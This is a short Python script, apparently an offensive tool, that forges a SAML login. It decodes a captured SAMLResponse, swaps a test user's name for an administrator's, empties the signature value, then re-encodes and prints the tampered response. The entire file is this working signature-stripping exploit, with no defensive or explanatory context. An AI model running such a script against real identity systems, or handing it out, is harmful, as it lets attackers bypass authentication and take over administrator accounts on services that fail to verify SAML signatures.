import urllib.parse
import base64
from urllib.parse import unquote
from urllib.parse import quote


tUser = input('Test Username: ').encode('UTF-8')
aUser = input('Admin Username: ').encode('UTF-8')

saml_dec = base64.b64decode(unquote(input('SAMLRespone: ')))
saml_edit = saml_dec.replace(tUser,aUser)

sig_start = "<ds:SignatureValue>".encode('UTF-8')
sig_end = "</ds:SignatureValue>".encode('UTF-8')
select_start = saml_edit.find(sig_start) + len(sig_start)
select_end = saml_edit.find(sig_end)
selected = saml_edit[select_start:select_end]
saml_fin = saml_edit.replace(selected,b'')
final = urllib.parse.quote(base64.b64encode(saml_fin).decode())

print ('\n\n\n\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n\n\n')
print (final)

